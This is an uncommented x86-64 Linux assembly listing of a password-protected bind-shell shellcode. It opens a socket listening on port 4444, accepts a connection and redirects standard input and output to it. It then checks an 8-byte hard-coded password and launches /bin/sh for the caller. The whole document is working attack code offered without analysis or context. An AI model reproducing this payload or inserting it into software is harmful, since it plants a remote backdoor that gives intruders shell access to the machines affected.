global _start

_start:

    xor rdx, rdx
    xor rsi, rsi
    mov al, 41
    mov dil, 2
    mov sil, 1
    mov dl, bl
    syscall

    mov rdi, rax

    xor rax, rax

    mov dword [rsp - 4] , eax
    mov word [rsp - 6] ,0x5c11
    mov byte [rsp - 8] , 0x2
    sub rsp , 8

    xor rdx, rdx
    mov al, 49
    mov rsi, rsp
    mov dl, 16
    syscall

    xor rsi, rsi
    mov al, 50
    mov sil, 2
    syscall

    mov al, 43
    sub rsp, 0x10
    mov rsi, rsp
    push 0x10
    mov rdx, rsp

    syscall

    mov r9, rax

    mov al, 3
    syscall

    xor rsi, rsi
    xor rbx, rbx
    mov al, 33
    mov rdi, r9
    mov rsi, rbx
    syscall

    mov al, 33
    mov sil, 1
    syscall

    mov al, 33
    mov sil, 2
    syscall

    xor rax, rax

    push r10
    mov rsi, rsp
        
    xor rdx, rdx
    mov dl, 8
    syscall

    xor rax, rax
    mov rax, 0x7373736574796238
    mov rdi, rsi
    scasq
    jz Exec

    xor rax, rax
    mov al, 60
    syscall

Exec:

    xor rax, rax
    push rax

    mov rbx, 0x68732f2f6e69622f
    push rbx

    mov rdi, rsp

    push rax

    mov rdx, rsp

    push rdi
    mov rsi, rsp
    mov al, 59
    syscall
